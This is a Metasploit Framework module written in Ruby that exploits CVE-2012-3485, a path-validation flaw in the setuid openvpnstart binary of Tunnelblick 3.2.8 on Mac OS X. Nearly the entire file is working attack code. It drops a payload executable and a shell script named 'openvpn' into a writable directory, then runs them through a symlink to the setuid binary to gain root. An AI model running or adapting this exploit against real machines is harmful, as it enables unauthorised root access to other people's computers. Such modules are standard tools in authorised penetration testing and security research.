##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/exploit/exe'

class Metasploit4 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Common

	def initialize(info={})
		super( update_info( info, {
				'Name'           => 'Setuid Tunnelblick Privilege Escalation',
				'Description'    => %q{
						This module exploits a vulnerability in Tunnelblick 3.2.8 on Mac OS X. The
					vulnerability exists in the setuid openvpnstart, where an insufficient
					validation of path names allows execution of arbitrary shell scripts as root.
					This module has been tested successfully on Tunnelblick 3.2.8 build 2891.3099
					over Mac OS X 10.7.5.
				},
				'References'     =>
					[
						[ 'CVE', '2012-3485' ],
						[ 'EDB', '20443' ],
						[ 'URL', 'http://blog.zx2c4.com/791' ]
					],
				'License'        => MSF_LICENSE,
				'Author'         =>
					[
						'Jason A. Donenfeld', # Vulnerability discovery and original Exploit
						'juan vazquez'        # Metasploit module
					],
				'DisclosureDate' => 'Aug 11 2012',
				'Platform'       => 'osx',
				'Arch'           => [ ARCH_X86, ARCH_X64 ],
				'SessionTypes'   => [ 'shell' ],
				'Targets'        =>
					[
						[ 'Tunnelblick 3.2.8 / Mac OS X x86',    { 'Arch' => ARCH_X86 } ],
						[ 'Tunnelblick 3.2.8 / Mac OS X x64',    { 'Arch' => ARCH_X64 } ]
					],
				'DefaultOptions' => { "PrependSetresuid" => true, "WfsDelay" => 2 },
				'DefaultTarget' => 0
			}))
		register_options([
				# These are not OptPath becuase it's a *remote* path
				OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
				OptString.new("Tunnelblick", [ true, "Path to setuid openvpnstart executable", "/Applications/Tunnelblick.app/Contents/Resources/openvpnstart" ])
			], self.class)
	end

	def check
		if not file?(datastore["Tunnelblick"])
			print_error "openvpnstart not found"
			return CheckCode::Safe
		end

		check = session.shell_command_token("find  #{datastore["Tunnelblick"]} -type f -user root -perm -4000")

		if check =~ /openvpnstart/
			return CheckCode::Vulnerable
		end

		return CheckCode::Safe
	end

	def clean
		file_rm(@link)
		cmd_exec("rm -rf #{datastore["WritableDir"]}/openvpn")
	end

	def exploit

		print_status("Creating directory...")
		cmd_exec "mkdir -p #{datastore["WritableDir"]}/openvpn/openvpn-0"

		exe_name = rand_text_alpha(8)
		@exe_file = "#{datastore["WritableDir"]}/openvpn/openvpn-0/#{exe_name}"
		print_status("Dropping executable #{@exe_file}")
		write_file(@exe_file, generate_payload_exe)
		cmd_exec "chmod +x #{@exe_file}"


		evil_sh =<<-EOF
#!/bin/sh
#{@exe_file}
		EOF

		@sh_file = "#{datastore["WritableDir"]}/openvpn/openvpn-0/openvpn"
		print_status("Dropping shell script #{@sh_file}...")
		write_file(@sh_file, evil_sh)
		cmd_exec "chmod +x #{@sh_file}"

		link_name = rand_text_alpha(8)
		@link = "#{datastore["WritableDir"]}/#{link_name}"
		print_status("Creating symlink #{@link}...")
		cmd_exec "ln -s -f -v #{datastore["Tunnelblick"]} #{@link}"

		print_status("Running...")
		begin
			cmd_exec "#{@link} OpenVPNInfo 0"
		rescue
			print_error("Failed. Cleaning files #{@link} and the #{datastore["WritableDir"]}/openvpn directory")
			clean
			return
		end
		print_warning("Remember to clean files: #{@link} and the #{datastore["WritableDir"]}/openvpn directory")
	end
end


